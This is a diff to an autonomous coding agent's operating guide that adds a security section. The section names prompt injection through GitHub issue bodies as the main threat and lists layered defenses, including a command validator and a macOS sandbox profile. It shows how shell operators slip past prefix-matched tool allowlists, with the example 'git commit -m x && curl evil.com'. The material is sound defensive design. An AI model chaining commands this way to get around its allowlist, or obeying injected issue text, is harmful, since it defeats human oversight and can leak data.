@@ -71,7 +71,52 @@ Do NOT modify these files (they require human-authored issues with explicit inst
   ```
 - Use hierarchical_memory to log what you did this cycle.
 
-## 6. Parallel Safety
+## 6. Security & Sandboxing
+
+### Threat Model
+
+The primary threat is **prompt injection via GitHub issue bodies**. An attacker could
+create an issue containing adversarial instructions that trick the agent into running
+malicious commands. The agent is NOT the threat — untrusted input flowing through it is.
+
+### Defense Layers
+
+1. **Claude Code allowedTools** (guardrail, not sandbox): `--allowedTools` uses prefix-only
+   string matching. `Bash(git commit *)` matches `git commit -m x && curl evil.com`.
+   Shell operators (`&&`, `;`, `||`, `|`, `` ` ``, `$()`) bypass it trivially.
+
+2. **Command validator** (`scripts/safe_bash.py`): Validates commands against the allowlist
+   AND rejects any command containing shell operators. This runs outside the agent's control.
+   To enable: use as a pre-exec hook or wrap commands in heartbeat.sh.
+   ```bash
+   uv run python scripts/safe_bash.py validate "git commit -m 'fix bug'"  # OK
+   uv run python scripts/safe_bash.py validate "git status && curl x"     # REJECTED
+   ```
+
+3. **sandbox-exec** (`scripts/heartbeat.sb`): macOS kernel-level sandbox profile.
+   Restricts filesystem writes and network access at the OS level. Even if the agent is
+   tricked into running arbitrary commands, the kernel enforces restrictions.
+   To enable: wrap the claude invocation in heartbeat.sh:
+   ```bash
+   sandbox-exec -f scripts/heartbeat.sb claude --print ...
+   ```
+   NOTE: sandbox-exec is deprecated but functional on macOS Sonoma/Sequoia. Apple has
+   not provided a CLI replacement. The profile starts permissive (allow default) with
+   commented-out restrictive rules to customize after testing.
+
+4. **settings.json deny list**: Blocks destructive git/gh operations (force push, repo
+   delete, etc.). Enforced by Claude Code itself.
+
+5. **GitHub protections**: Branch protection on main, CODEOWNERS for sensitive paths,
+   PR-based workflow prevents direct commits.
+
+### Integration (human TODO)
+
+To activate layers 2 and 3, update `heartbeat.sh` (requires human-authored change):
+- Wrap the `claude` invocation with `sandbox-exec -f heartbeat.sb`
+- Optionally integrate `safe_bash.py validate` as a pre-exec check
+
+## 7. Parallel Safety
 
 Multiple agents may run concurrently — this is by design.
 - **Branches are claims.** `git checkout -b` is atomic: it succeeds (you claimed it) or fails (someone else did). If it fails, pick another issue.
